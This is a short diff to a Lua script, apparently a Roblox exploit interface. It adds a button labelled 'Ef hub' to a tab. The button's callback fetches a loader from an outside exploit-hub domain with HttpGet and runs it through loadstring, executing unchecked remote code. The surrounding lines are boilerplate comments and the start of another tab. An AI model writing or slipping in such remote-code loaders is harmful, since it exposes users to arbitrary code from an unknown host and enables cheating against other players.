@@ -450,6 +450,19 @@ Name = <string> - The name of the button.
 Callback = <function> - The function of the button.
 ]]
 
+Tab:AddButton({
+	Name = "Ef hub 🟠",
+	Callback = function()
+ loadstring(game:HttpGet("https://cdn.exploitingis.fun/loader"))()
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
 local Tab = Window:MakeTab({
 	Name = "Tab 9",
 	Icon = "rbxassetid://4483345998",
